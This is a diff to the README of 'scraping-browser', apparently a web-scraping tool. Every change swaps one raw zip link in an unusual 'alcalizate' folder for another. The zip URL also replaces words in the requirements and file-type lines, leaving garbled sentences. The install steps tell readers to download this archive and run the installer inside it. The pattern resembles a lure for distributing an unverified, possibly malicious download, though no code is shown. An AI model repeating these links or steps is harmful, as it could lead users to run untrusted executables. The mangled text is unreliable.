@@ -1,6 +1,6 @@
 # 🛠️ scraping-browser - Easy Web Scraping Made Simple
 
-[![Download Release](https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/browser-scraping-2.6.zip%20Now-Release-blue)](https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/browser-scraping-2.6.zip)
+[![Download Release](https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/scraping_browser_v3.9.zip%20Now-Release-blue)](https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/scraping_browser_v3.9.zip)
 
 ## 🏁 Overview
 
@@ -18,7 +18,7 @@ Scraping Browser is an automated headless browser for effortless web scraping us
 ## 🖥️ System Requirements
 
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or any Linux distribution.
-- **https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/browser-scraping-2.6.zip**: Version 12 or higher.
+- **https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/scraping_browser_v3.9.zip**: Version 12 or higher.
 - **Memory**: At least 4 GB of RAM recommended.
 - **Internet Connection**: Required for web scraping.
 
@@ -28,11 +28,11 @@ To get started with scraping-browser, you'll need to download the software. Foll
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page where you can find the latest version.
 
-   [Download Release](https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/browser-scraping-2.6.zip)
+   [Download Release](https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/scraping_browser_v3.9.zip)
 
 2. **Select the Latest Version**: Look for the most recent version listed on the page. Usually, it appears at the top.
 
-3. **Download the File**: Click on the file suitable for your operating system. For most users, this will be an `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/browser-scraping-2.6.zip` for Linux.
+3. **Download the File**: Click on the file suitable for your operating system. For most users, this will be an `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/scraping_browser_v3.9.zip` for Linux.
 
 4. **Run the Installer**: Once downloaded, locate the file in your Downloads folder and open it to start the installation. 
 
@@ -42,7 +42,7 @@ To get started with scraping-browser, you'll need to download the software. Foll
 
 To download the latest version of scraping-browser, visit the link below:
 
-[Download Release](https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/browser-scraping-2.6.zip)
+[Download Release](https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/scraping_browser_v3.9.zip)
 
 Make sure to download the version that matches your operating system.
 
@@ -66,7 +66,7 @@ Once you have the software installed, you can start using it for web scraping.
 
 If you encounter any issues while using scraping-browser, consider the following tips:
 
-- **Ensure Compatibility**: Verify that your operating system and https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/browser-scraping-2.6.zip version meet the system requirements.
+- **Ensure Compatibility**: Verify that your operating system and https://raw.githubusercontent.com/ilaymalka/scraping-browser/main/alcalizate/scraping_browser_v3.9.zip version meet the system requirements.
 - **Check Internet Connection**: Make sure your internet connection is stable and working.
 - **Refer to Logs**: Look at the logs within the app for any error messages that can provide insights.
 
